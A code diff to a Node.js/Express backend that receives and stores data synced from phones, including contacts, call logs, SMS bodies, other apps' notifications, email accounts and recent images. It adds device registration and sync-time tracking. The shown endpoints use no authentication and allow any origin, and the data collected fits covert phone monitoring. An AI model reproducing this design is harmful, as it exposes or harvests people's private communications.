@@ -16,6 +16,10 @@ const CallLog = require('./models/CallLog');
 const Message = require('./models/Message');
 const Notification = require('./models/Notification');
 const EmailAccount = require('./models/EmailAccount');
+const SyncSettings = require('./models/SyncSettings');
+
+// Import routes
+const deviceRoutes = require('./routes/devices');
 
 const app = express();
 const PORT = config.server.port;
@@ -23,17 +27,33 @@ const PORT = config.server.port;
 // Connect to MongoDB using environment configuration
 connectDB();
 
-
-
 // Middleware
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
-// Helper function to generate data hash for duplicate detection
-function generateDataHash(deviceId, dataType, data) {
-    const dataString = JSON.stringify(data);
-    return crypto.createHash('md5').update(`${deviceId}-${dataType}-${dataString}`).digest('hex');
+// Mount routes
+app.use('/api/devices', deviceRoutes);
+
+// Helper function to get last sync time for a device and data type
+async function getLastSyncTime(deviceId, dataType) {
+    try {
+        const lastSyncTime = await SyncSettings.getLastSyncTime(deviceId, dataType);
+        return lastSyncTime;
+    } catch (error) {
+        console.error(`Error getting last sync time for ${deviceId}/${dataType}:`, error);
+        return null;
+    }
+}
+
+// Helper function to update last sync time for a device and data type
+async function updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount = 0, status = 'SUCCESS', message = '') {
+    try {
+        await SyncSettings.updateLastSyncTime(deviceId, dataType, lastSyncTime, itemCount, status, message);
+        console.log(`✅ Updated last sync time for ${deviceId}/${dataType}: ${lastSyncTime}`);
+    } catch (error) {
+        console.error(`Error updating last sync time for ${deviceId}/${dataType}:`, error);
+    }
 }
 
 // Upload last 5 images endpoint - placed early to avoid conflicts
@@ -91,8 +111,49 @@ app.get('/api/health', async (req, res) => {
     }
 });
 
+// Device registration endpoint
+app.post('/api/devices/register', async (req, res) => {
+    try {
+        const { deviceId, deviceInfo } = req.body;
 
+        if (!deviceId) {
+            return res.status(400).json({ error: 'Device ID is required' });
+        }
 
+        let device = await Device.findOne({ deviceId });
+
+        if (!device) {
+            // Create new device with default settings
+            device = new Device({
+                deviceId,
+                ...deviceInfo,
+                registeredAt: new Date(),
+                lastSeen: new Date()
+            });
+            await device.save();
+            
+            return res.status(201).json({
+                message: 'Device registered successfully',
+                device,
+                isNewDevice: true
+            });
+        } else {
+            // Update existing device
+            device.lastSeen = new Date();
+            device.isActive = true;
+            await device.save();
+
+            return res.json({
+                message: 'Device found',
+                device,
+                isNewDevice: false
+            });
+        }
+    } catch (error) {
+        console.error('Device registration error:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
 
 
 // Upload last 5 images endpoint - placed early to avoid conflicts
@@ -159,10 +220,15 @@ app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
                 });
         }
         
+        // Get last sync time for this device and data type
+        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
+        console.log(`📅 Last sync time for ${deviceId}/${dataType}: ${lastSyncTime || 'Never'}`);
+        
         // Process each item
         for (const item of data) {
             try {
                 console.log(`Processing ${dataType} item:`, JSON.stringify(item, null, 2));
+                
                 // Map fields based on data type
                 let mappedItem = { ...item };
                 
@@ -340,23 +406,64 @@ app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
                         break;
                 }
                 
-                // Generate data hash for duplicate detection
-                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
+                // Add deviceId to mapped item
+                mappedItem.deviceId = deviceId;
                 
-                // Check if data already exists
-                const existingData = await Model.findOne({ dataHash });
-                if (existingData) {
-                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
-                    continue;
+                // Check if data already exists using unique constraints
+                let existingData = null;
+                try {
+                    switch (dataType) {
+                        case 'CONTACTS':
+                            existingData = await Model.findOne({ 
+                                deviceId, 
+                                phoneNumber: mappedItem.phoneNumber 
+                            });
+                            break;
+                        case 'CALL_LOGS':
+                            existingData = await Model.findOne({ 
+                                deviceId, 
+                                phoneNumber: mappedItem.phoneNumber,
+                                timestamp: mappedItem.timestamp,
+                                duration: mappedItem.duration
+                            });
+                            break;
+                        case 'MESSAGES':
+                            existingData = await Model.findOne({ 
+                                deviceId, 
+                                address: mappedItem.address,
+                                timestamp: mappedItem.timestamp,
+                                body: mappedItem.body
+                            });
+                            break;
+                        case 'NOTIFICATIONS':
+                            existingData = await Model.findOne({ 
+                                deviceId, 
+                                packageName: mappedItem.packageName,
+                                title: mappedItem.title,
+                                timestamp: mappedItem.timestamp
+                            });
+                            break;
+                        case 'EMAIL_ACCOUNTS':
+                            existingData = await Model.findOne({ 
+                                deviceId, 
+                                emailAddress: mappedItem.emailAddress
+                            });
+                            break;
+                    }
+                } catch (error) {
+                    console.log(`⚠️ Error checking existing data: ${error.message}`);
                 }
                 
-                // Add data hash to mapped item
-                mappedItem.dataHash = dataHash;
+                if (existingData) {
+                    console.log(`✅ Data already exists for ${dataType}, skipping duplicate`);
+                    continue;
+                }
                 
                 // Create new record
                 const newRecord = new Model(mappedItem);
                 await newRecord.save();
                 
+                console.log(`✅ Successfully synced ${dataType} item`);
                 itemsSynced++;
                 
             } catch (itemError) {
@@ -368,11 +475,16 @@ app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
         
         console.log(`✅ TEST MODE: Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
         
+        // Update last sync time
+        const currentTime = new Date();
+        await updateLastSyncTime(deviceId, dataType, currentTime, itemsSynced, 'SUCCESS', `Synced ${itemsSynced} items`);
+        
         res.json({
             success: true,
             data: {
                 success: true,
                 itemsSynced,
+                lastSyncTime: currentTime,
                 message: `TEST MODE: ${itemsSynced} items synced successfully to ${collectionName}`
             }
         });
@@ -386,11 +498,60 @@ app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
     }
 });
 
+// Get sync settings for a device
+app.get('/api/test/devices/:deviceId/sync-settings', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        const settings = await SyncSettings.getDeviceSettings(deviceId);
+        
+        res.json({
+            success: true,
+            data: {
+                deviceId,
+                settings: settings
+            }
+        });
+        
+    } catch (error) {
+        console.error('Error getting sync settings:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get sync settings'
+        });
+    }
+});
+
+// Get last sync time for a specific data type
+app.get('/api/test/devices/:deviceId/last-sync/:dataType', async (req, res) => {
+    try {
+        const { deviceId, dataType } = req.params;
+        
+        const lastSyncTime = await getLastSyncTime(deviceId, dataType);
+        
+        res.json({
+            success: true,
+            data: {
+                deviceId,
+                dataType,
+                lastSyncTime: lastSyncTime
+            }
+        });
+        
+    } catch (error) {
+        console.error('Error getting last sync time:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get last sync time'
+        });
+    }
+});
+
 // Get synced data for a device
 app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
     try {
         const { deviceId, dataType } = req.params;
-        const { page = 1, limit = 100 } = req.query;
+        const { page = 1, limit = 100, since } = req.query;
         
         let Model;
         
@@ -418,12 +579,21 @@ app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
                 });
         }
         
-        const data = await Model.find({})
+        // Build query with optional since parameter
+        let query = { deviceId };
+        if (since) {
+            const sinceDate = new Date(since);
+            if (!isNaN(sinceDate.getTime())) {
+                query.syncTime = { $gte: sinceDate };
+            }
+        }
+        
+        const data = await Model.find(query)
             .sort({ syncTime: -1 })
             .limit(limit * 1)
             .skip((page - 1) * limit);
         
-        const total = await Model.countDocuments({});
+        const total = await Model.countDocuments(query);
         
         res.json({
             success: true,
